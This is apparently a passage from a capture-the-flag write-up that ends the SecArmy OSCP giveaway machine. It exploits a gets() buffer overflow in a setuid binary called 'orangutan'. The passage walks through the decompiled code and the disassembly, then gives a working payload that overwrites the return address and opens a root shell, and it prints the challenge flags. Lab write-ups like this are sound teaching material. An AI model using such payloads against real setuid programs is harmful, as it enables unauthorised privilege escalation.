          ╟╫╫╫╫╫╫╫╫╫╫╫▓M░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓╫╫╫╫╫╫╫╫╫╫▓
         ╔╫╫╫╫╫╫╫╫╫╫╫▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟▓▓╫╫╫╫╫╫╫╫╫╫▌
         ╫╫╫╫╫╫╫╫╫╫╫▓▓▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟▓▓▓╫╫╫╫╫╫╫╫╫╫U
        ╟╫╫╫╫╫╫╫╫╫╫╫▓▓▓░░░░░░░░░╠▄▄░░░░░░░░░░░░░░░░░░░▄▄░░░░░░░░░╟▓▓▓╫╫╫╫╫╫╫╫╫╫▓
        ╫╫╫╫╫╫╫╫╫╫╫╣▓▓▓@░░░░░░░░╠███▓▄▄▄░░░░░░░░╠▄▄▄▓██▀░░░░░░░░╠▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫U
       ╟╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓░░░░░░░░░░╠▀▀████████████▀▀▀░░░░░░░░░░╟▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫▓
       ▓╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░µ╬▓▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫U
      J╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓╬µ░░░░░░░░░░░░░░░░░░░░░░░░µ▄╬▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫@
      ╟╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓@╬▄▄µ░░░░░░░░µµ▄▄╬▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫
      ╣╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫
      ╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫U
      ╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▌ ╙╫╫╫╫╫╫╫╫M╣╬▀░░░╣▓▓▓▓▓▓▓Ñ░░╠▓M╣▓╫╫╫╫╫╫╫▀ ╙╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫U
     ]╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╡  ╫╫╫▓╩╠╣M░░░░░░░░╫╫╫╫╫╫Ñ░░░░░░░░╣╠╠╢╫╫╫H J╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╡
     ]╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╡ ╔░░╠░░░░░░░░░░░░░╢╫╫╫╫╫░░░░░░░░░░░░░Ö░░N J╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▌
     ╞╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╡ 1░░░░░░░░░░░░░░░░░╫╫╫╫▌░░░░░░░░░░░░░░░░Ñ J╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓
     ╟╫╫╫╫╫▓╣╣╣╣╣╫╫╫╫╫╡  1░░░░░░░░░░░░░░░░╣╫╫╫░░░░░░░░░░░░░░░░Ñ  J╫╫╫╫╫▓▓╣╣╣▓╫╫╫╫╫╫
     ╚╣░░░░░░░░░░░░░╠╠╡   1░░░░░░░░░░░░░░░╟╫╫╫░░░░░░░░░░░░░░░Ñ   J╬░░░░░░░░░░░░░░╠╬
     1░░░░░░░░░░░░░░░░H    1░░░░░░░░░░░░░░╫M▀╬░░░░░░░░░░░░░░H     ░░░░░░░░░░░░░░░░░
      ╙╨ª "╨╨``╨╨" ╚╨ª      1░░░░░░░░░░░░Ñ    1░░░░░░░░░░░░H      "╨╨``╨╨" ╚╨ª ª╨╨`
                             ╙░░░░░░░░░╨`      `ªÑ░░░░░░░░H
    
Can u feeeeeed my orangutan ^^

 
nueve@svos:~$ file orangutan 
orangutan: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cedba4c198b3199fd59348c775d1c6931dfdcb1c, not stripped
```
Nueve --> `flag9{689d3e}`

For the finale, it looks like we need to pwn the ELF `orangutan`. 

Used `scp` to transfer the file to my box, and the analysis began...

## R00t - PWN setuid binary:

```
kali@kali:~/Documents/secarmyctf/final$ ./orangatan 
hello pwner 
pwnme if u can ;) 
hello
kali@kali:~/Documents/secarmyctf/final$
```

The binary seems simple. It outputs text, then we give it input.

Let's examine it further with `ghidra`...

Looking at the decompiled `main` function:

```c++
undefined8 main(void)

{
  char my_input [24];
  long target;
  
  target = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("hello pwner ");
  puts("pwnme if u can ;) ");
  gets(my_input);
  if (target == 0xcafebabe) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh",(char **)0x0);
  }
  return 0;
}
```
This pwn challenge is a bit tricky. From the `main` function code we can see that there is a char array called `my_input` that has 24 bytes allocated to it in the stack. 

Next there is another variable called `target`, that we need to change its value to be `0xcafebabe` in order to execute commands as `root`. 

the function `gets()` is called the `my_input` variable, which is an indication that we can abuse a `Buffer Overflow`. 

Here's the trick; The `target` is located above our `input` in the stack. Meaning, we supply input that grows in the direction opposite to the `target`, therefore, we cannot change the target's value using our buffer overflow technique. However, we can still get those sweet `r00t` privileges. Here's how...


Let's open the binary in `GDB` and disassemble the `main` fucntion.

```
   0x0000000000400812 <+107>:   mov    eax,0x0
   0x0000000000400817 <+112>:   call   0x400660 <gets@plt>
   0x000000000040081c <+117>:   mov    eax,0xcafebabe
   0x0000000000400821 <+122>:   cmp    QWORD PTR [rbp-0x8],rax
   0x0000000000400825 <+126>:   jne    0x400879 <main+210>
   0x0000000000400827 <+128>:   mov    edi,0x0
   0x000000000040082c <+133>:   mov    eax,0x0
   0x0000000000400831 <+138>:   call   0x400690 <setuid@plt>
   0x0000000000400836 <+143>:   mov    edi,0x0
   0x000000000040083b <+148>:   mov    eax,0x0
   0x0000000000400840 <+153>:   call   0x400670 <setgid@plt>
   0x0000000000400845 <+158>:   mov    edi,0x0
   0x000000000040084a <+163>:   mov    eax,0x0
   0x000000000040084f <+168>:   call   0x4006b0 <seteuid@plt>
   0x0000000000400854 <+173>:   mov    edi,0x0
   0x0000000000400859 <+178>:   mov    eax,0x0
   0x000000000040085e <+183>:   call   0x4006a0 <setegid@plt>
   0x0000000000400863 <+188>:   mov    edx,0x0
   0x0000000000400868 <+193>:   mov    esi,0x0
   0x000000000040086d <+198>:   lea    rdi,[rip+0xb0]        # 0x400924
   0x0000000000400874 <+205>:   call   0x400680 <execvp@plt>
   0x0000000000400879 <+210>:   mov    eax,0x0
   0x000000000040087e <+215>:   leave  
   0x000000000040087f <+216>:   ret 
```

Let's set a breaking point before the gets function: `b *0x400812`.

When it prompts us for our input, supply a lot of `A`'s and keep steping through the instructions until we see the `leave` and `ret` functions being executed. 

![pwn](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/Misc/images/SecArmyCTF/secarmy-pwn_rsp.PNG "RIP... is that you?")

When the `ret` instruction gets executed, the content of `$rsp` is going to be the next `$rip`, and right now the contents of `$rsp` is our user supplied input. Which means we can redirect the execution of the program to execute the `setuid` functionality. 

The `setuid` starts at `0x0000000000400827 <+128>:   mov    edi,0x0`, so we need to the value of `$rsp` to have `0x0000000000400827` before the execution of `ret`.

Looking back at `ghidra` we can see that our input takes `0x28` bytes from the stack, which means we need `0x28` bytes of garbage data until we start overwriting the `$rsp`.
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined8 __stdcall main(void)
             undefined8        RAX:8          <RETURN>
             undefined8        Stack[-0x10]:8 target                                  XREF[2]:     004007af(W), 
                                                                                                   00400821(R)  
             undefined1[24]    Stack[-0x28]   my_input                                XREF[1]:     0040080b(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:004006dd(*), 
                                                                                          _start:004006dd(*), 00400950, 
                                                                                          004009f0(*)  
        004007a7 55              PUSH       RBP

```

With all that information, the final payload is going to be:

```
(python3 -c 'print("A"*0x28 + "\x27\x08\x40\x00\x00\x00\x00\x00") ; cat) | ./orangutan
```

After getting through the `setuid` functions, we need to catch the shell at the end. Therefore, we will immediately call the `cat` command to supply input to the `execvp('/bin/sh')`.

```
nueve@svos:~$ (python3 -c 'print("A"*40 + "\x27\x08\x40\x00\x00\x00\x00\x00")' ; cat) | ./orangutan 
hello pwner 
pwnme if u can ;) 
id 
uid=0(root) gid=0(root) groups=0(root),1009(nueve)
cat /root/root.txt
Congratulations!!!

You have finally completed the SECARMY OSCP Giveaway Machine

Here's your final flag segment: flag10{33c9661bfd}
```

Root --> `flag10{33c9661bfd}`


GG!

🤘💀🤘
